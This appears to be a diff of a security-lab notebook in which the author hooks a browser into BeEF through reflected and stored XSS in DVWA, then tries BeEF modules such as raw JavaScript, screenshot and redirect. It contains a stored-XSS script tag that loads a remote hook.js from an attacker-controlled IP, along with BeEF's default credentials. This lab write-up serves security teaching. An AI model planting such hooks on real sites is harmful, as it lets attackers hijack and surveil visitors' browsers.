@@ -789,17 +789,17 @@ without using quotation marks inside the payload.
 
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 
-# Exercise: Hooking a Browser Using Stored and Reflected XSS with BeEF (DVWA)
+ Exercise: Hooking a Browser Using Stored and Reflected XSS with BeEF (DVWA)
 
-## Objective
+ Objective
 
-In this exercise, we demonstrated how a Cross-Site Scripting (XSS) vulnerability can be used to hook a victim's browser into the **Browser Exploitation Framework (BeEF)**. Rather than executing a simple `alert()` message, we injected the BeEF hook script into vulnerable pages so that any browser executing the payload becomes connected to the BeEF server.
+In this exercise, we demonstrated how a Cross-Site Scripting (XSS) vulnerability can be used to hook a victim's browser into the Browser Exploitation Framework (BeEF). Rather than executing a simple `alert()` message, we injected the BeEF hook script into vulnerable pages so that any browser executing the payload becomes connected to the BeEF server.
 
-> **Note:** This exercise was performed in a controlled lab environment using DVWA for educational purposes.
+> Note: This exercise was performed in a controlled lab environment using DVWA for educational purposes.
 
 ---
 
-# Step 1: Start the BeEF Framework
+ Step 1: Start the BeEF Framework
 
 On the Kali Linux machine, launch the BeEF Framework.
 
@@ -809,13 +809,13 @@ beef-xss
 
 Once BeEF starts, open the web interface and log in using the default credentials.
 
-**Username**
+Username
 
 ```text
 beef
 ```
 
-**Password**
+Password
 
 ```text
 beef
@@ -828,7 +828,7 @@ After logging in, the BeEF dashboard opens. Initially, no browsers are connected
 
 ---
 
-# Step 2: Obtain the BeEF Hook Script
+ Step 2: Obtain the BeEF Hook Script
 
 BeEF provides a JavaScript hook that must execute inside the victim's browser.
 
@@ -861,15 +861,15 @@ The hook script becomes:
 
 ---
 
-# Part 1 – Reflected XSS
+ Part 1 – Reflected XSS
 
-## Step 3: Open the Reflected XSS Page
+ Step 3: Open the Reflected XSS Page
 
 Navigate to:
 
-**DVWA → XSS (Reflected)**
+DVWA → XSS (Reflected)
 
-Set the security level to **Low**.
+Set the security level to Low.
 
 Instead of the normal alert payload:
 
@@ -889,31 +889,31 @@ The URL now contains the injected JavaScript.
 
 ---
 
-## Step 4: Execute the Payload
+ Step 4: Execute the Payload
 
 When the vulnerable URL is opened, the browser loads the BeEF hook.
 
-Returning to the BeEF dashboard, the browser now appears under **Online Browsers**.
+Returning to the BeEF dashboard, the browser now appears under Online Browsers.
 
 
 
 ---
 
-# Part 2 – Stored XSS
+ Part 2 – Stored XSS
 
 Stored XSS is more dangerous because the payload is permanently saved in the application. Any user who visits the vulnerable page automatically executes the JavaScript.
 
 ---
 
-## Step 5: Open the Stored XSS Page
+ Step 5: Open the Stored XSS Page
 
 Navigate to:
 
-**DVWA → XSS (Stored)**
+DVWA → XSS (Stored)
 
 The Name field limits input length, so increase the maximum length using the browser's Developer Tools.
 
-Right-click the Name field → **Inspect**.
+Right-click the Name field → Inspect.
 
 Change:
 
@@ -932,7 +932,7 @@ maxlength="500"
 
 ---
 
-## Step 6: Inject the BeEF Hook
+ Step 6: Inject the BeEF Hook
 
 Enter the following payload:
 
@@ -940,49 +940,298 @@ Enter the following payload:
 <script src="http://172.16.219.133:3000/hook.js"></script>
 ```
 
-Click **Sign Guestbook**.
+Click Sign Guestbook.
 
 The payload is now stored inside the application's database.
 
 
 ---
 
-## Step 7: Simulate a Victim Visiting the Page
+ Step 7: Simulate a Victim Visiting the Page
 
 On another machine (Windows in our lab), open DVWA and navigate to:
 
-**XSS (Stored)**
+XSS (Stored)
 
 No suspicious URL or interaction is required. Simply loading the page causes the browser to execute the stored JavaScript.
 
 
 ---
 
-## Step 8: Verify the Browser is Hooked
+ Step 8: Verify the Browser is Hooked
 
 Return to the BeEF dashboard.
 
-The Windows browser now appears under **Online Browsers**, confirming that the JavaScript hook executed successfully.
+The Windows browser now appears under Online Browsers, confirming that the JavaScript hook executed successfully.
 
 The BeEF console also displays information such as:
 
-* Browser type
-* Operating system
-* IP address
-* Online status
+ Browser type
+ Operating system
+ IP address
+ Online status
 
 <img width="1440" height="848" alt="Screenshot 2026-08-05 at 7 11 57 PM" src="https://github.com/user-attachments/assets/85ca1137-c45a-4c2f-bef1-ba0755abff7c" />
 
 
 ---
 
-# Key Takeaways
+ Key Takeaways
 
-* BeEF uses a small JavaScript hook to establish communication with a victim's browser.
-* Reflected XSS requires the victim to open a specially crafted URL containing the payload.
-* Stored XSS is more dangerous because the payload remains stored on the server and executes automatically whenever users visit the vulnerable page.
-* After a browser is hooked, BeEF can interact with the browser through its available modules, depending on browser capabilities and security settings.
-* Trusted or high-traffic websites with Stored XSS vulnerabilities present a greater risk because many users may unknowingly execute the malicious JavaScript.
+ BeEF uses a small JavaScript hook to establish communication with a victim's browser.
+ Reflected XSS requires the victim to open a specially crafted URL containing the payload.
+ Stored XSS is more dangerous because the payload remains stored on the server and executes automatically whenever users visit the vulnerable page.
+ After a browser is hooked, BeEF can interact with the browser through its available modules, depending on browser capabilities and security settings.
+ Trusted or high-traffic websites with Stored XSS vulnerabilities present a greater risk because many users may unknowingly execute the malicious JavaScript.
 
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 
+ Exercise: Interacting With a Hooked Browser Using BeEF
+
+ Objective
+
+In this exercise, we explored the BeEF command interface after successfully hooking a browser. We examined the information BeEF collects about the hooked browser and tested several basic modules in our isolated DVWA lab.
+
+---
+
+ Step 1: Select the Hooked Browser
+
+After the Windows browser is successfully hooked, it appears under:
+
+Online Browsers → Hooked Browser
+
+Click the target IP address.
+
+The right-hand panel now provides information and commands for the selected browser.
+
+<img width="1426" height="740" alt="Screenshot 2026-08-06 at 5 12 10 PM" src="https://github.com/user-attachments/assets/dfca286b-111d-45e5-a51e-a3135991cb98" />
+
+---
+
+ Step 2: Examine Browser Information
+
+The Details section provides information about the hooked browser.
+
+We can observe information such as:
+
+ Browser type and version
+ Browser engine
+ Language
+ Browser architecture
+ Installed plugins
+ Enabled browser components
+
+The browser architecture and operating-system architecture may be different.
+
+For example:
+
+```text
+Browser architecture: 32-bit
+Operating system architecture: 64-bit
+```
+
+<img width="1432" height="768" alt="Screenshot 2026-08-06 at 5 12 23 PM" src="https://github.com/user-attachments/assets/ef15e9c3-e61d-44b0-b91d-905e969adec1" />
+
+
+---
+
+ Step 3: Examine the Target Information
+
+Scrolling through the information reveals additional details about the hooked session.
+
+We can observe:
+
+ Current page
+ Referrer page
+ Target IP address
+ Operating system
+ System architecture
+ Available browser information
+
+In our lab, the target is the Windows machine running the hooked browser.
+
+
+
+---
+
+ Step 4: Examine the Logs
+
+The Logs section records events associated with the hooked browser.
+
+For example, we can see events such as:
+
+```text
+Browser joined
+Browser window focused
+Browser window lost focus
+```
+
+These logs help us understand what has happened during the current hooked session.
+
+
+
+---
+
+ Step 5: Explore the Available Modules
+
+The Commands section contains the modules that can be executed against the hooked browser.
+
+The modules are organized into different categories, including:
+
+ Browser
+ Exploits
+ Social Engineering
+ Network
+ Other browser-related functionality
+
+You can also use the search box to find a specific module.
+
+<img width="1438" height="780" alt="Screenshot 2026-08-06 at 5 12 35 PM" src="https://github.com/user-attachments/assets/4272c4b2-fdd7-46a3-8481-2c5bf9a7cd3f" />
+
+
+---
+
+ Step 6: Browser Command – Alert Dialog
+
+For our first basic test, search for:
+
+```text
+Alert Dialog
+```
+
+Select the BeEF alert-dialog module.
+
+Enter:
+
+```text
+test
+```
+
+Then click:
+
+Execute
+
+The hooked browser displays the message.
+
+<img width="1438" height="775" alt="Screenshot 2026-08-06 at 5 14 40 PM" src="https://github.com/user-attachments/assets/22dc19cc-6d38-46c8-b7b8-f500e4ce5cb0" />
+
+<img width="1438" height="668" alt="Screenshot 2026-08-06 at 5 14 57 PM" src="https://github.com/user-attachments/assets/a06512f7-2fa3-4619-af36-7a40617d6c19" />
+
+ Result
+
+This confirms that BeEF can execute JavaScript functionality within the hooked browser.
+
+---
+
+ Step 7: Raw JavaScript
+
+Another module available in BeEF is:
+
+Raw JavaScript
+
+This module allows JavaScript to be executed within the context of the hooked page.
+
+For our safe proof-of-concept, use:
+
+```javascript
+alert("BeEF Raw JavaScript");
+```
+
+Click Execute.
+
+The message appears inside the hooked browser.
+
+<img width="1433" height="826" alt="Screenshot 2026-08-06 at 5 15 41 PM" src="https://github.com/user-attachments/assets/940fb42e-0660-4754-b010-d85e06cc685e" />
+
+
+<img width="1440" height="532" alt="Screenshot 2026-08-06 at 5 15 52 PM" src="https://github.com/user-attachments/assets/d583a8e4-27af-4c21-a9ae-e44385f78d19" />
+
+ Result
+
+The test demonstrates that arbitrary JavaScript supplied to the module can execute within the browser context.
+
+---
+
+ Step 8: Screenshot Module
+
+Next, we tested the browser screenshot functionality available in BeEF.
+
+Search for the screenshot-related module and execute it against the hooked browser.
+
+After execution, BeEF can return an image representing the browser's current view, subject to browser and environment limitations.
+
+<img width="1427" height="795" alt="Screenshot 2026-08-06 at 5 16 10 PM" src="https://github.com/user-attachments/assets/75f28b38-7222-483e-a5bc-fc63fd60dd30" />
+
+
+ Result
+
+The screenshot demonstrates that browser-level information can sometimes be collected from a hooked session.
+
+> Important lab observation: this captures the hooked browser/page context, not necessarily the entire Windows desktop or other applications/tabs.
+
+---
+
+ Step 9: Redirect Module
+
+BeEF also provides a Redirect Browser module.
+
+For this exercise, use a harmless destination such as the BeEF project website.
+
+Enter the destination and click:
+
+<img width="1437" height="762" alt="Screenshot 2026-08-06 at 5 17 51 PM" src="https://github.com/user-attachments/assets/410bb2d2-3b86-407b-bd52-288df41b75cc" />
+
+
+Execute
+
+The hooked browser is redirected to the specified page.
+
+<img width="1436" height="892" alt="Screenshot 2026-08-06 at 5 17 40 PM" src="https://github.com/user-attachments/assets/40081b27-2098-4ef7-82b4-0cb754419d65" />
+
+
+ Result
+
+The browser successfully navigates away from the original page.
+
+---
+
+ Step 10: Network Visualization
+
+The Network section provides a visual representation of the hooked browser and its relationship to the BeEF server.
+
+In a larger lab containing multiple hooked browsers, this section can help visualize the connected clients.
+
+<img width="1440" height="744" alt="Screenshot 2026-08-06 at 5 12 46 PM" src="https://github.com/user-attachments/assets/865d3d9f-b22f-428d-94d6-e7cf77b9c5db" />
+
+
+---
+
+ BeEF Interface Overview
+
+| Section                | Purpose                                          |
+| ---------------------- | ------------------------------------------------ |
+| Details            | Browser and target information                   |
+| Logs               | Events generated during the session              |
+| Commands           | Modules available for the hooked browser         |
+| Rider              | HTTP request-related functionality               |
+| Network            | Visualization of connected browsers              |
+| WebRTC             | Browser-to-browser/network-related functionality |
+| Exploits           | Tests for browser/application vulnerabilities    |
+| Social Engineering | Controlled demonstrations involving browser UI   |
+
+---
+
+ Key Takeaways
+
+ A hooked browser appears under Online Browsers in BeEF.
+ Selecting the browser exposes information and available modules.
+ Browser details can reveal information such as browser version, language, architecture, and operating system.
+ The Commands section is where browser-level modules are executed.
+ Alert Dialog provides a simple proof that JavaScript execution is working.
+ Raw JavaScript allows controlled JavaScript testing.
+ The screenshot module demonstrates browser-view capture capabilities.
+ The redirect module demonstrates browser navigation control.
+ BeEF's capabilities depend heavily on the browser, permissions, security controls, and the specific module being used.
+ All testing should remain inside the authorized DVWA/Windows lab environment.
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
